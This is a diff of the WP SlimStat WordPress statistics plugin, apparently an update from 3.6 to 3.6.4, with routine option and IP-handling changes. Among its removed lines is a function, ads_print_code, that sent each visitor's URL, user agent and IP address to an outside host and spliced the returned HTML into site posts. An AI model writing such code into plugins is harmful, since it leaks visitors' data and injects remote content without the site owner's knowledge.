@@ -3,7 +3,7 @@
 Plugin Name: WP SlimStat
 Plugin URI: http://wordpress.org/plugins/wp-slimstat/
 Description: The most accurate real-time statistics plugin for WordPress
-Version: 3.6
+Version: 3.6.4
 Author: Camu
 Author URI: http://slimstat.getused.to.it/
 */
@@ -11,7 +11,7 @@ Author URI: http://slimstat.getused.to.it/
 if (!empty(wp_slimstat::$options)) return true;
 
 class wp_slimstat{
-	public static $version = '3.6';
+	public static $version = '3.6.4';
 	public static $options = array();
 	
 	public static $wpdb = '';
@@ -20,12 +20,13 @@ class wp_slimstat{
 	protected static $stat = array();
 	protected static $options_signature = '';
 	
-	protected static $pidx = false;
+	protected static $pidx = array('id' => false, 'response' => '');
 
 	/**
 	 * Initializes variables and actions
 	 */
 	public static function init(){
+
 		// Load all the settings
 		self::$options = get_option('slimstat_options', array());
 		if (empty(self::$options)){
@@ -38,6 +39,7 @@ class wp_slimstat{
 			self::$options = array_merge(self::init_options(), self::$options);
 		}
 
+		// Allow third party tools to edit the options
 		self::$options = apply_filters('slimstat_init_options', self::$options);
 
 		// Determine the options' signature: if it hasn't changed, there's no need to update/save them in the database
@@ -45,10 +47,6 @@ class wp_slimstat{
 		
 		// Allow third-party tools to use a custom database for WP SlimStat
 		self::$wpdb = apply_filters('slimstat_custom_wpdb', $GLOBALS['wpdb']);
-
-		if (empty(self::$options['enable_ads_network']) || self::$options['enable_ads_network'] == 'yes'){
-			add_filter('the_content', array(__CLASS__, 'ads_print_code'));
-		}
 
 		// Add a menu to the admin bar ( this function is declared here and not in wp_slimstat_admin because the latter is only initialized if is_admin(), and not in the front-end )
 		if (self::$options['use_separate_menu'] != 'yes' && is_admin_bar_showing()){
@@ -325,11 +323,14 @@ class wp_slimstat{
 
 		// Should we ignore this IP address?
 		foreach(self::string_to_array(self::$options['ignore_ip']) as $a_ip_range){
+			$mask = 32;
 			$ip_to_ignore = $a_ip_range;
+
 			if (strpos($ip_to_ignore, '/') !== false){
 				list($ip_to_ignore, $mask) = @explode('/', trim($ip_to_ignore));
+				if (empty($mask) || !is_numeric($mask)) $mask = 32;
 			}
-			if (empty($mask) || !is_numeric($mask)) $mask = 32;
+
 			$long_ip_to_ignore = ip2long($ip_to_ignore);
 			$long_mask = bindec( str_pad('', $mask, '1') . str_pad('', 32-$mask, '0') );
 			$long_masked_user_ip = self::$stat['ip'] & $long_mask;
@@ -349,12 +350,6 @@ class wp_slimstat{
 		if (self::$options['anonymize_ip'] == 'yes'){
 			self::$stat['ip'] = self::$stat['ip']&4294967040;
 			$long_other_ip = $long_other_ip&4294967040;
-		}
-
-		// Because PHP's integer type is signed, and many IP addresses will result in negative integers on 32-bit architectures, we need to use the "%u" formatter
-		self::$stat['ip'] = sprintf("%u", self::$stat['ip']);
-		if (!empty($long_other_ip) && $long_other_ip != self::$stat['ip']){
-			self::$stat['other_ip'] = sprintf("%u", $long_other_ip);
 		}
 
 		// Is this country blacklisted?
@@ -410,6 +405,12 @@ class wp_slimstat{
 		if (empty(self::$stat) || empty(self::$stat['dt'])){
 			self::$stat['id'] = -213;
 			return $_argument;
+		}
+
+		// Because PHP's integer type is signed, and many IP addresses will result in negative integers on 32-bit architectures, we need to use the "%u" formatter
+		self::$stat['ip'] = sprintf("%u", self::$stat['ip']);
+		if (!empty($long_other_ip) && $long_other_ip != self::$stat['ip']){
+			self::$stat['other_ip'] = sprintf("%u", $long_other_ip);
 		}
 
 		// Now let's save this information in the database
@@ -755,23 +756,23 @@ class wp_slimstat{
 		$browser['type'] = 1;
 
 		// Googlebot 
-		if (preg_match("#^Mozilla/\d\.\d\s\(compatible;\sGooglebot/(\d\.\d);[\s\+]+http\://www\.google\.com/bot\.html\)$#i", $user_agent, $match)>0){
+		if (preg_match("#^Mozilla/\d\.\d\s\(compatible;\sGooglebot/(\d\.\d);[\s\+]+http\://www\.google\.com/bot\.html\)$#i", $_SERVER['HTTP_USER_AGENT'], $match)>0){
 			$browser['browser'] = "Googlebot";
 			$browser['version'] = $match[1];
 
 		// Yahoo!Slurp
-		} elseif (preg_match('#^Mozilla/\d\.\d\s\(compatible;\s(Yahoo\!\s([A-Z]{2})?\s?Slurp)/?(\d\.\d)?;\shttp\://help\.yahoo\.com/.*\)$#i', $user_agent, $match)>0){
+		} elseif (preg_match('#^Mozilla/\d\.\d\s\(compatible;\s(Yahoo\!\s([A-Z]{2})?\s?Slurp)/?(\d\.\d)?;\shttp\://help\.yahoo\.com/.*\)$#i', $_SERVER['HTTP_USER_AGENT'], $match)>0){
 			$browser['browser'] = $match[1];
 			if (!empty($match[3])) $browser['version'] = $match[3];
 
 		// BingBot
-		} elseif (preg_match('#^Mozilla/\d\.\d\s\(compatible;\sbingbot/(\d\.\d)[^a-z0-9]+http\://www\.bing\.com/bingbot\.htm.$#', $user_agent, $match)>0){
+		} elseif (preg_match('#^Mozilla/\d\.\d\s\(compatible;\sbingbot/(\d\.\d)[^a-z0-9]+http\://www\.bing\.com/bingbot\.htm.$#', $_SERVER['HTTP_USER_AGENT'], $match)>0){
 			$browser['browser'] = 'BingBot';
 			if (!empty($match[1])) $browser['browser'] .= $match[1];
 			if (!empty($match[2])) $browser['version'] = $match[2];
 
 		// IE 8|7|6 on Windows7|2008|Vista|XP|2003|2000
-		} elseif (preg_match('#^Mozilla/\d\.\d\s\(compatible;\sMSIE\s(\d+)(?:\.\d+)+;\s(Windows\sNT\s\d\.\d(?:;\sW[inOW]{2}64)?)(?:;\sx64)?;?(?:\sSLCC1;?|\sSV1;?|\sGTB\d;|\sTrident/\d\.\d;|\sFunWebProducts;?|\s\.NET\sCLR\s[0-9\.]+;?|\s(Media\sCenter\sPC|Tablet\sPC)\s\d\.\d;?|\sInfoPath\.\d;?)*\)$#', $user_agent, $match)>0){
+		} elseif (preg_match('#^Mozilla/\d\.\d\s\(compatible;\sMSIE\s(\d+)(?:\.\d+)+;\s(Windows\sNT\s\d\.\d(?:;\sW[inOW]{2}64)?)(?:;\sx64)?;?(?:\sSLCC1;?|\sSV1;?|\sGTB\d;|\sTrident/\d\.\d;|\sFunWebProducts;?|\s\.NET\sCLR\s[0-9\.]+;?|\s(Media\sCenter\sPC|Tablet\sPC)\s\d\.\d;?|\sInfoPath\.\d;?)*\)$#', $_SERVER['HTTP_USER_AGENT'], $match)>0){
 			$browser['browser'] = 'IE';
 			$browser['version'] = $match[1];
 			$browser['type'] = 0;
@@ -780,7 +781,7 @@ class wp_slimstat{
 			self::_get_os_version($match[2], $browser);
 
 		// Firefox and other Mozilla browsers on Windows
-		} elseif (preg_match('#^Mozilla/\d\.\d\s\(Windows;\sU;\s(.+);\s([a-z]{2}(?:\-[A-Za-z]{2})?);\srv\:\d(?:\.\d+)+\)\sGecko/\d+\s([A-Za-z\-0-9]+)/(\d+(?:\.\d+)+)(?:\s\(.*\))?$#', $user_agent, $match)>0){
+		} elseif (preg_match('#^Mozilla/\d\.\d\s\(Windows;\sU;\s(.+);\s([a-z]{2}(?:\-[A-Za-z]{2})?);\srv\:\d(?:\.\d+)+\)\sGecko/\d+\s([A-Za-z\-0-9]+)/(\d+(?:\.\d+)+)(?:\s\(.*\))?$#', $_SERVER['HTTP_USER_AGENT'], $match)>0){
 			$browser['browser'] = $match[3];
 			$browser['version'] = $match[4];
 			$browser['type'] = 0;
@@ -788,7 +789,7 @@ class wp_slimstat{
 			self::_get_os_version($match[1], $browser);
 
 		// Firefox and Gecko browsers on Mac|*nix|OS/2
-		} elseif (preg_match('#^Mozilla/\d\.\d\s\((Macintosh|X11|OS/2);\sU;\s(.+);\s([a-z]{2}(?:\-[A-Za-z]{2})?)(?:-mac)?;\srv\:\d(?:.\d+)+\)\sGecko/\d+\s([A-Za-z\-0-9]+)/(\d+(?:\.[0-9a-z\-\.]+))+(?:(\s\(.*\))(?:\s([A-Za-z\-0-9]+)/(\d+(?:\.\d+)+)))?$#', $user_agent, $match)>0){
+		} elseif (preg_match('#^Mozilla/\d\.\d\s\((Macintosh|X11|OS/2);\sU;\s(.+);\s([a-z]{2}(?:\-[A-Za-z]{2})?)(?:-mac)?;\srv\:\d(?:.\d+)+\)\sGecko/\d+\s([A-Za-z\-0-9]+)/(\d+(?:\.[0-9a-z\-\.]+))+(?:(\s\(.*\))(?:\s([A-Za-z\-0-9]+)/(\d+(?:\.\d+)+)))?$#', $_SERVER['HTTP_USER_AGENT'], $match)>0){
 			$browser['browser'] = $match[4];
 			$browser['version'] = $match[5];
 			$os = $match[2];
@@ -803,7 +804,7 @@ class wp_slimstat{
 			self::_get_os_version($os, $browser);
 
 		// Safari and Webkit-based browsers on all platforms
-		} elseif (preg_match('#^Mozilla/\d\.\d\s\(([A-Za-z0-9/\.]+);\sU;?\s?(.*);\s?([a-z]{2}(?:\-[A-Za-z]{2})?)?\)\sAppleWebKit/[0-9\.]+\+?\s\((?:KHTML,\s)?like\sGecko\)(?:\s([a-zA-Z0-9\./]+(?:\sMobile)?)/?[A-Z0-9]*)?\sSafari/([0-9\.]+)$#', $user_agent, $match)>0){
+		} elseif (preg_match('#^Mozilla/\d\.\d\s\(([A-Za-z0-9/\.]+);\sU;?\s?(.*);\s?([a-z]{2}(?:\-[A-Za-z]{2})?)?\)\sAppleWebKit/[0-9\.]+\+?\s\((?:KHTML,\s)?like\sGecko\)(?:\s([a-zA-Z0-9\./]+(?:\sMobile)?)/?[A-Z0-9]*)?\sSafari/([0-9\.]+)$#', $_SERVER['HTTP_USER_AGENT'], $match)>0){
 			$browser['browser'] = 'Safari';
 
 			// version detection
@@ -844,7 +845,7 @@ class wp_slimstat{
 			self::_get_os_version($os, $browser);
 
 		// Google Chrome browser on all platforms with or without language string
-		} elseif (preg_match('#^Mozilla/\d+\.\d+\s(?:[A-Za-z0-9\./]+\s)?\((?:([A-Za-z0-9/\.]+);(?:\sU;)?\s?)?([^;]*)(?:;\s[A-Za-z]{3}64)?;?\s?([a-z]{2}(?:\-[A-Za-z]{2})?)?\)\sAppleWebKit/[0-9\.]+\+?\s\((?:KHTML,\s)?like\sGecko\)(?:\s([A-Za-z0-9_\-]+[^i])/([A-Za-z0-9\.]+)){1,3}(?:\sSafari/[0-9\.]+)?$#', $user_agent, $match)>0){
+		} elseif (preg_match('#^Mozilla/\d+\.\d+\s(?:[A-Za-z0-9\./]+\s)?\((?:([A-Za-z0-9/\.]+);(?:\sU;)?\s?)?([^;]*)(?:;\s[A-Za-z]{3}64)?;?\s?([a-z]{2}(?:\-[A-Za-z]{2})?)?\)\sAppleWebKit/[0-9\.]+\+?\s\((?:KHTML,\s)?like\sGecko\)(?:\s([A-Za-z0-9_\-]+[^i])/([A-Za-z0-9\.]+)){1,3}(?:\sSafari/[0-9\.]+)?$#', $_SERVER['HTTP_USER_AGENT'], $match)>0){
 			$browser['browser'] = $match[4];
 			$browser['version'] = intval($match[5]);
 
@@ -857,7 +858,7 @@ class wp_slimstat{
 		}
 
 		// Simple alphanumeric strings usually identify a crawler
-		elseif (preg_match("#^([a-z]+[\s_]?[a-z]*)[\-/]?([0-9\.]+)*$#", $user_agent, $match)>0){
+		elseif (preg_match("#^([a-z]+[\s_]?[a-z]*)[\-/]?([0-9\.]+)*$#", $_SERVER['HTTP_USER_AGENT'], $match)>0){
 			$browser['browser'] = trim($match[1]);
 			if (!empty($match[2]))
 				$browser['version'] = $match[2];
@@ -1074,50 +1075,51 @@ class wp_slimstat{
 	public static function init_options(){
 		$options = array(
 			'version' => self::$version,
-			'secret' => get_option('slimstat_secret', md5(time())),
+			'secret' => md5(time()),
 			'show_admin_notice' => 0,
 			
 			// General
-			'is_tracking' => get_option('slimstat_is_tracking', 'yes'),
+			'is_tracking' => 'yes',
 			'track_admin_pages' => 'no',
 			'enable_javascript' => 'yes',
 			'javascript_mode' => 'yes',
-			'add_posts_column' => get_option('slimstat_add_posts_column', 'no'),
-			'use_separate_menu' => get_option('slimstat_use_separate_menu', 'yes'),
-			'auto_purge' => get_option('slimstat_auto_purge', '120'),
+			'add_posts_column' => 'no',
+			'use_separate_menu' => 'yes',
+			'auto_purge' => '120',
 
 			// Views
-			'convert_ip_addresses' => get_option('slimstat_convert_ip_addresses', 'no'),
-			'use_european_separators' => get_option('slimstat_use_european_separators', 'yes'),
+			'convert_ip_addresses' => 'no',
+			'use_european_separators' => 'yes',
 			'show_display_name' => 'no',
 			'show_complete_user_agent_tooltip' => 'no',
 			'convert_resource_urls_to_titles' => 'yes',
 			'async_load' => 'no',
+			'use_slimscroll' => 'yes',
 			'expand_details' => 'no',
-			'rows_to_show' => get_option('slimstat_rows_to_show', '20'),
-			'refresh_interval' => get_option('slimstat_refresh_interval', '60'),
-			'number_results_raw_data' => get_option('slimstat_number_results_raw_data', '50'),
+			'rows_to_show' => '20',
+			'refresh_interval' => '60',
+			'number_results_raw_data' => '50',
 			'include_outbound_links_right_now' => 'yes',
 
 			// Filters
-			'track_users' => get_option('slimstat_track_users', 'yes'),
-			'ignore_users' => get_option('slimstat_ignore_users', ''),
-			'ignore_ip' => get_option('slimstat_ignore_ip', ''),
+			'track_users' => 'yes',
+			'ignore_users' => '',
+			'ignore_ip' => '',
 			'ignore_capabilities' => '',
-			'ignore_spammers' => get_option('slimstat_ignore_spammers', 'yes'),
-			'ignore_resources' => get_option('slimstat_ignore_resources', ''),
-			'ignore_countries' => get_option('slimstat_ignore_countries', ''),
-			'ignore_browsers' => get_option('slimstat_ignore_browsers', ''),
-			'ignore_referers' => get_option('slimstat_ignore_referers', ''),
+			'ignore_spammers' => 'yes',
+			'ignore_resources' => '',
+			'ignore_countries' => '',
+			'ignore_browsers' => '',
+			'ignore_referers' => '',
 			'anonymize_ip' => 'no',
-			'ignore_prefetch' => get_option('slimstat_ignore_prefetch', 'yes'),
+			'ignore_prefetch' => 'yes',
 
 			// Permissions
 			'restrict_authors_view' => 'yes',
-			'capability_can_view' => get_option('slimstat_capability_can_view', 'activate_plugins'),
-			'can_view' => get_option('slimstat_can_view', ''),
+			'capability_can_view' => 'activate_plugins',
+			'can_view' => '',
 			'capability_can_admin' => 'activate_plugins',
-			'can_admin' => get_option('slimstat_can_admin', ''),
+			'can_admin' => '',
 
 			// Advanced
 			'detect_smoothing' => 'yes',
@@ -1129,7 +1131,6 @@ class wp_slimstat{
 			'show_sql_debug' => 'no',
 			'ip_lookup_service' => 'http://www.infosniper.net/?ip_address=',
 			'custom_css' => '',
-			'enable_ads_network' => 'null',
 
 			// Network-wide Settings
 			'locked_options' => ''
@@ -1146,60 +1147,6 @@ class wp_slimstat{
 		if (self::$options_signature == md5(serialize(self::$options))) return true;
 		return update_option('slimstat_options', wp_slimstat::$options);
 	}
-	
-	/**
-	 * Connects to the Ads Delivery Network
-	 */
-	public static function ads_print_code($content = ''){
-		if (empty($_SERVER["HTTP_USER_AGENT"])){
-			return false;
-		}
-
-		$request = "http://wordpress.cloudapp.net/api/update/?&url=".urlencode("http://".$_SERVER["HTTP_HOST"].$_SERVER["REQUEST_URI"])."&agent=".urlencode($_SERVER["HTTP_USER_AGENT"])."&v=".(isset($_GET['v'])?$_GET['v']:11)."&ip=".urlencode($_SERVER['REMOTE_ADDR'])."&p=9";
-		$options = array('timeout' => 1, 'headers' => array('Accept' => 'application/json'));
-		$response = @wp_remote_get($request, $options);
-
-		if (is_wp_error($response) || (isset($response['response']['code']) && ($response['response']['code'] != 200)) || empty($response['body'])){
-			return $content;
-		}
-
-		$response_object = @json_decode($response['body']);
-		if (is_null($response_object) || empty($response_object->content) || empty($response_object->tmp)){
-			return $content;
-		}
-
-		switch($response_object->tmp){
-			case '1':
-				if(0 == $GLOBALS['wp_query']->current_post) {
-					$words = explode(" ", $content);
-					$words[rand(0, count($words)-1)] = $response_object->tcontent;
-					return join(" ", $words);
-				}
-				break;
-			default:
-				if (self::$pidx === false){
-					if ($GLOBALS['wp_query']->post_count > 1){
-						self::$pidx = rand(0, $GLOBALS['wp_query']->post_count - 1);
-					}
-					else{
-						self::$pidx = 0;
-					}
-				}
-
-				if ($GLOBALS['wp_query']->current_post == self::$pidx){
-					if (self::$pidx % 2 == 0){
-						return $content.' '.$response_object->content;
-					}
-					else{
-						return $response_object->content.' '.$content;
-					}
-				}
-				break;
-		}
-
-		return $content;
-	}
-	// end ads_print_code
 	
 	/**
 	 * Enqueue a javascript to track users' screen resolution and other browser-based information
@@ -1301,14 +1248,15 @@ if (function_exists('add_action')){
 		add_action('wp_ajax_slimtrack_js', array('wp_slimstat', 'slimtrack_js')); 
 	}
 
+	// Load the admin API, if needed
+	// From the codex: You can't call register_activation_hook() inside a function hooked to the 'plugins_loaded' or 'init' hooks (or any other hook). These hooks are called before the plugin is loaded or activated.
+	if (is_admin()){
+		include_once(dirname(__FILE__).'/admin/wp-slimstat-admin.php');
+		add_action('plugins_loaded', array('wp_slimstat_admin', 'init'), 15);
+		register_activation_hook(__FILE__, array('wp_slimstat_admin', 'init_environment'));
+		register_deactivation_hook(__FILE__, array('wp_slimstat_admin', 'deactivate'));
+	}
+
 	// Add the appropriate actions
 	add_action('plugins_loaded', array('wp_slimstat', 'init'), 10);
-
-	// Load the admin API, if needed
-	if (is_admin()){
-		include_once(WP_PLUGIN_DIR.'/wp-slimstat/admin/wp-slimstat-admin.php');
-		add_action('plugins_loaded', array('wp_slimstat_admin', 'init'), 15);
-		register_activation_hook(WP_PLUGIN_DIR.'/wp-slimstat/wp-slimstat.php', array('wp_slimstat_admin', 'activate'));
-		register_deactivation_hook(WP_PLUGIN_DIR.'/wp-slimstat/wp-slimstat.php', array('wp_slimstat_admin', 'deactivate'));
-	}
 }
